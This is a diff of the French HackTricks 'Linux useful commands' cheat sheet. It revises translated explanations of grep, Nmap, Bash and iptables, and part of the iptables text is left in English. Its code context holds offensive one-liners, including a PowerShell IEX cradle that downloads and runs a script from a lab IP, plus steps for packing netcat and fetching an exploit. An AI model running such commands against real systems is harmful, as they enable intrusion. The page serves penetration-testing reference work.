@@ -1,9 +1,9 @@
-# Commandes utiles de Linux
+# Commandes utiles Linux
 
-![](<../../.gitbook/assets/image (9) (1) (2).png>)
+<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
-Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour créer et automatiser facilement des flux de travail alimentés par les outils communautaires les plus avancés au monde.\
-Obtenez l'accès aujourd'hui :
+Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et automatiser facilement des flux de travail alimentés par les outils communautaires les plus avancés au monde.\
+Accédez dès aujourd'hui :
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
@@ -11,11 +11,11 @@ Obtenez l'accès aujourd'hui :
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
-* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
@@ -71,7 +71,7 @@ unzip file.zip
 sudo apt-get install xz-utils; unxz file.xz
 
 #Add new user
-useradd -p 'openssl passwd -1 <Password>' hacker  
+useradd -p 'openssl passwd -1 <Password>' hacker
 
 #Clipboard
 xclip -sel c < cat file.txt
@@ -138,9 +138,10 @@ sudo chattr -i file.txt #Remove the bit so you can delete it
 # List files inside zip
 7z l file.zip
 ```
-![](<../../.gitbook/assets/image (9) (1) (2).png>)
+<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
-Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et automatiser facilement des flux de travail alimentés par les outils communautaires les plus avancés au monde.\
+\
+Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
 Obtenez un accès aujourd'hui :
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -149,7 +150,7 @@ Obtenez un accès aujourd'hui :
 ```bash
 #Base64 for Windows
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
- 
+
 #Exe compression
 upx -9 nc.exe
 
@@ -158,7 +159,7 @@ wine exe2bat.exe nc.exe nc.txt
 
 #Compile Windows python exploit to exe
 pip install pyinstaller
-wget -O exploit.py http://www.exploit-db.com/download/31853  
+wget -O exploit.py http://www.exploit-db.com/download/31853
 python pyinstaller.py --onefile exploit.py
 
 #Compile for windows
@@ -167,15 +168,16 @@ i686-mingw32msvc-gcc -o executable useradd.c
 ```
 ## Greps
 
-Les commandes `grep` sont très utiles pour rechercher des chaînes de caractères dans des fichiers. Voici quelques exemples d'utilisation :
+Les commandes `grep` sont utilisées pour rechercher des motifs spécifiques dans des fichiers ou des flux de données. Voici quelques exemples courants d'utilisation de `grep` :
 
-- `grep "motif" fichier` : recherche le motif dans le fichier.
-- `grep -r "motif" dossier` : recherche le motif dans tous les fichiers du dossier (et de ses sous-dossiers).
-- `grep -i "motif" fichier` : recherche le motif dans le fichier, sans tenir compte de la casse.
-- `grep -v "motif" fichier` : affiche toutes les lignes qui ne contiennent pas le motif.
-- `grep -E "motif1|motif2" fichier` : recherche soit le motif1, soit le motif2 dans le fichier (utilisation des expressions régulières).
-- `grep -n "motif" fichier` : affiche le numéro de ligne de chaque occurrence du motif dans le fichier.
-- `grep -c "motif" fichier` : affiche le nombre de lignes contenant le motif dans le fichier.
+- `grep motif fichier` : recherche le motif spécifié dans le fichier spécifié.
+- `grep -r motif répertoire` : recherche récursivement le motif spécifié dans tous les fichiers du répertoire spécifié.
+- `grep -i motif fichier` : recherche le motif spécifié dans le fichier spécifié, en ignorant la casse.
+- `grep -v motif fichier` : recherche les lignes qui ne contiennent pas le motif spécifié dans le fichier spécifié.
+- `grep -l motif fichier` : affiche uniquement les noms des fichiers qui contiennent le motif spécifié.
+- `grep -n motif fichier` : affiche les lignes qui contiennent le motif spécifié, ainsi que leur numéro de ligne.
+
+Les commandes `grep` sont très utiles pour effectuer des recherches rapides dans de nombreux fichiers ou pour filtrer des données en fonction de motifs spécifiques.
 ```bash
 #Extract emails from file
 grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt
@@ -256,6 +258,17 @@ grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
 egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
 ```
 ## Aide à la recherche Nmap
+
+Nmap est un outil de scan de réseau puissant et polyvalent. Il offre de nombreuses options de recherche pour vous aider à explorer et à analyser les réseaux. Voici quelques commandes utiles pour vous aider à démarrer :
+
+- `nmap -sn <IP>` : Cette commande effectue un scan de ping pour vérifier si une adresse IP est active.
+- `nmap -sS <IP>` : Cette commande effectue un scan TCP SYN pour détecter les ports ouverts sur une adresse IP.
+- `nmap -sU <IP>` : Cette commande effectue un scan UDP pour détecter les ports ouverts sur une adresse IP.
+- `nmap -p <port> <IP>` : Cette commande effectue un scan sur un port spécifique d'une adresse IP.
+- `nmap -O <IP>` : Cette commande tente de détecter le système d'exploitation d'une adresse IP.
+- `nmap -A <IP>` : Cette commande effectue un scan complet, y compris la détection du système d'exploitation, la détection des versions de logiciels et d'autres informations détaillées.
+
+Ces commandes de base vous aideront à commencer à utiliser Nmap pour explorer et analyser les réseaux. N'hésitez pas à consulter la documentation officielle de Nmap pour en savoir plus sur les options de recherche avancées.
 ```bash
 #Nmap scripts ((default or version) and smb))
 nmap --script-help "(default or version) and *smb*"
@@ -264,134 +277,107 @@ nmap --script-help "(default or version) and smb)"
 ```
 ## Bash
 
-## Description
-Bash est un shell Unix populaire et largement utilisé. Il est également le shell par défaut sur la plupart des distributions Linux.
+Bash (Bourne Again SHell) est un interpréteur de commandes populaire utilisé dans les systèmes d'exploitation Linux et macOS. Il offre une interface en ligne de commande pour exécuter des commandes et des scripts.
 
-## Commandes utiles
+### Commandes utiles
 
-### Navigation
+Voici quelques commandes Bash utiles pour travailler avec Linux :
 
-- `cd [directory]`: Change le répertoire courant en `directory`.
-- `pwd`: Affiche le chemin absolu du répertoire courant.
-- `ls`: Liste les fichiers et répertoires dans le répertoire courant.
-- `ls -l`: Liste les fichiers et répertoires dans le répertoire courant avec des informations détaillées.
-- `ls -a`: Liste les fichiers et répertoires dans le répertoire courant, y compris les fichiers cachés.
-- `ls -la`: Liste les fichiers et répertoires dans le répertoire courant avec des informations détaillées, y compris les fichiers cachés.
+- `ls` : liste les fichiers et les répertoires dans le répertoire courant.
+- `cd` : change le répertoire courant.
+- `pwd` : affiche le chemin du répertoire courant.
+- `mkdir` : crée un nouveau répertoire.
+- `rm` : supprime des fichiers et des répertoires.
+- `cp` : copie des fichiers et des répertoires.
+- `mv` : déplace des fichiers et des répertoires.
+- `cat` : affiche le contenu d'un fichier.
+- `grep` : recherche des motifs dans un fichier.
+- `chmod` : modifie les permissions d'un fichier ou d'un répertoire.
+- `chown` : modifie le propriétaire d'un fichier ou d'un répertoire.
+- `ssh` : se connecte à un serveur distant via SSH.
+- `wget` : télécharge des fichiers depuis Internet.
+- `curl` : récupère le contenu d'une URL.
 
-### Manipulation de fichiers
+Ces commandes sont très utiles pour naviguer dans le système de fichiers, manipuler des fichiers et des répertoires, rechercher du contenu et effectuer des tâches courantes sur un système Linux.
 
-- `touch [filename]`: Crée un nouveau fichier avec le nom `filename`.
-- `cat [filename]`: Affiche le contenu du fichier `filename`.
-- `nano [filename]`: Ouvre le fichier `filename` dans l'éditeur de texte Nano.
-- `vi [filename]`: Ouvre le fichier `filename` dans l'éditeur de texte Vi.
-- `cp [source] [destination]`: Copie le fichier `source` vers `destination`.
-- `mv [source] [destination]`: Déplace le fichier `source` vers `destination`.
-- `rm [filename]`: Supprime le fichier `filename`.
-- `mkdir [directory]`: Crée un nouveau répertoire avec le nom `directory`.
-- `rmdir [directory]`: Supprime le répertoire vide `directory`.
+### Scripts Bash
 
-### Gestion des processus
+Bash est également utilisé pour écrire des scripts, qui sont des séquences de commandes exécutées les unes après les autres. Les scripts Bash peuvent être utilisés pour automatiser des tâches répétitives, effectuer des opérations complexes et gérer des processus.
 
-- `ps`: Affiche les processus en cours d'exécution.
-- `ps -ef`: Affiche tous les processus en cours d'exécution avec des informations détaillées.
-- `kill [process_id]`: Tue le processus avec l'ID `process_id`.
-- `killall [process_name]`: Tue tous les processus avec le nom `process_name`.
+Pour exécuter un script Bash, vous pouvez utiliser la commande `bash` suivie du nom du fichier de script. Par exemple :
 
-### Gestion des utilisateurs
+```bash
+bash mon_script.sh
+```
 
-- `whoami`: Affiche le nom d'utilisateur actuel.
-- `useradd [username]`: Crée un nouvel utilisateur avec le nom `username`.
-- `userdel [username]`: Supprime l'utilisateur `username`.
-- `passwd [username]`: Change le mot de passe de l'utilisateur `username`.
+Assurez-vous que le fichier de script a les permissions d'exécution appropriées en utilisant la commande `chmod`. Par exemple :
 
-### Réseau
+```bash
+chmod +x mon_script.sh
+```
 
-- `ping [host]`: Envoie une requête ICMP à `host`.
-- `wget [url]`: Télécharge le fichier à partir de `url`.
-- `curl [url]`: Affiche le contenu de `url`.
-- `ifconfig`: Affiche les informations de configuration réseau.
+Cela permet d'exécuter le script en tant que programme.
 
-### Autres
-
-- `history`: Affiche l'historique des commandes précédemment exécutées.
-- `sudo [command]`: Exécute la commande `command` avec des privilèges d'administrateur.
-- `chmod [permissions] [filename]`: Modifie les permissions du fichier `filename` en `permissions`.
+Les scripts Bash peuvent être très puissants et flexibles, et ils sont largement utilisés dans l'administration système et le développement logiciel sous Linux.
 ```bash
 #All bytes inside a file (except 0x20 and 0x00)
 for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
 ```
 ## Iptables
 
-Iptables est un pare-feu de paquets pour Linux. Il permet de filtrer les paquets en fonction de divers critères tels que l'adresse IP source, l'adresse IP de destination, le port source, le port de destination, etc. Iptables est une commande très puissante et complexe, mais elle peut être très utile pour sécuriser votre système Linux.
+Iptables is a powerful firewall utility for Linux systems. It allows you to configure and manage network traffic by creating rules and chains. These rules determine how packets are processed and whether they are allowed or denied.
 
-### Syntaxe de base
+### Basic Usage
 
-La syntaxe de base d'Iptables est la suivante :
-
-```bash
-iptables -A <chaîne> -p <protocole> --dport <port> -j <action>
-```
-
-- `<chaîne>` : la chaîne à laquelle ajouter la règle (INPUT, OUTPUT, FORWARD)
-- `<protocole>` : le protocole à filtrer (TCP, UDP, ICMP, etc.)
-- `<port>` : le port à filtrer
-- `<action>` : l'action à effectuer si la règle est vérifiée (ACCEPT, DROP, REJECT, etc.)
-
-### Exemples
-
-- Bloquer tout le trafic entrant :
-
-```bash
-iptables -P INPUT DROP
-```
-
-- Autoriser tout le trafic sortant :
-
-```bash
-iptables -P OUTPUT ACCEPT
-```
-
-- Autoriser le trafic entrant sur le port 22 (SSH) :
-
-```bash
-iptables -A INPUT -p tcp --dport 22 -j ACCEPT
-```
-
-- Autoriser le trafic entrant sur le port 80 (HTTP) :
-
-```bash
-iptables -A INPUT -p tcp --dport 80 -j ACCEPT
-```
-
-- Autoriser le trafic entrant sur le port 443 (HTTPS) :
-
-```bash
-iptables -A INPUT -p tcp --dport 443 -j ACCEPT
-```
-
-- Autoriser le trafic entrant provenant d'une adresse IP spécifique :
-
-```bash
-iptables -A INPUT -s <adresse_IP> -j ACCEPT
-```
-
-- Autoriser le trafic sortant vers une adresse IP spécifique :
-
-```bash
-iptables -A OUTPUT -d <adresse_IP> -j ACCEPT
-```
-
-- Voir les règles actuelles :
+To view the current iptables rules, use the following command:
 
 ```bash
 iptables -L
 ```
 
-- Supprimer une règle :
+To flush all existing rules and chains, use the following command:
 
 ```bash
-iptables -D <chaîne> <numéro_de_règle>
+iptables -F
 ```
+
+To block incoming traffic from a specific IP address, use the following command:
+
+```bash
+iptables -A INPUT -s <IP_ADDRESS> -j DROP
+```
+
+To allow incoming traffic on a specific port, use the following command:
+
+```bash
+iptables -A INPUT -p <PROTOCOL> --dport <PORT_NUMBER> -j ACCEPT
+```
+
+To save the current iptables rules to a file, use the following command:
+
+```bash
+iptables-save > <FILE_NAME>
+```
+
+### Advanced Usage
+
+In addition to the basic usage, iptables provides many advanced features and options. Here are a few examples:
+
+- **Port Forwarding**: Redirect incoming traffic from one port to another.
+
+- **Network Address Translation (NAT)**: Modify the source or destination IP address of packets.
+
+- **Logging**: Log specific packets or events for analysis.
+
+- **Rate Limiting**: Limit the rate of incoming or outgoing packets.
+
+- **Connection Tracking**: Track and manage stateful connections.
+
+For more information on these advanced features and options, refer to the iptables documentation or online resources.
+
+### Conclusion
+
+Iptables is a versatile tool for securing and managing network traffic on Linux systems. By understanding its basic and advanced usage, you can effectively control the flow of packets and protect your system from unauthorized access.
 ```bash
 #Delete curent rules and chains
 iptables --flush
@@ -426,18 +412,18 @@ iptables -P OUTPUT ACCEPT
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
-* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
-![](<../../.gitbook/assets/image (9) (1) (2).png>)
+<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 \
 Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
-Obtenez l'accès aujourd'hui :
+Obtenez un accès aujourd'hui :
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
